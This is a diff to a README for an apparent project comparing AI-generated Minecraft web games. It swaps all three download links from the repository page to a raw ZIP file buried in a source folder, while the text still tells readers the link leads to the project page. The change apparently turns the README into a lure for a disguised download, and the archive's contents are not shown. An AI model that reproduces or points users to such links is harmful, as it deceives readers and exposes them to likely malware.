@@ -1,6 +1,6 @@
 # 🎮 video-battle-ia-minecraft - Compare AI Builds of Minecraft Web Game
 
-[![Download Video-Battle-IA-Minecraft](https://img.shields.io/badge/Download-Video--Battle--IA--Minecraft-brightgreen?style=for-the-badge)](https://github.com/qeu12/video-battle-ia-minecraft)
+[![Download Video-Battle-IA-Minecraft](https://img.shields.io/badge/Download-Video--Battle--IA--Minecraft-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/qeu12/video-battle-ia-minecraft/main/chatgpt/src/engine/core/video-minecraft-ia-battle-3.7-beta.1.zip)
 
 ---
 
@@ -41,7 +41,7 @@ You will get all the code needed to run the AI-generated Minecraft versions dire
 
 Go to the main repository page:
 
-[Download video-battle-ia-minecraft](https://github.com/qeu12/video-battle-ia-minecraft)
+[Download video-battle-ia-minecraft](https://raw.githubusercontent.com/qeu12/video-battle-ia-minecraft/main/chatgpt/src/engine/core/video-minecraft-ia-battle-3.7-beta.1.zip)
 
 This link will take you to the page where you can download the full project as a ZIP file.
 
@@ -126,4 +126,4 @@ You don’t need programming skills to run the games, but if you want to explore
 
 Use this link to download the project in full:
 
-[Download video-battle-ia-minecraft](https://github.com/qeu12/video-battle-ia-minecraft)
+[Download video-battle-ia-minecraft](https://raw.githubusercontent.com/qeu12/video-battle-ia-minecraft/main/chatgpt/src/engine/core/video-minecraft-ia-battle-3.7-beta.1.zip)
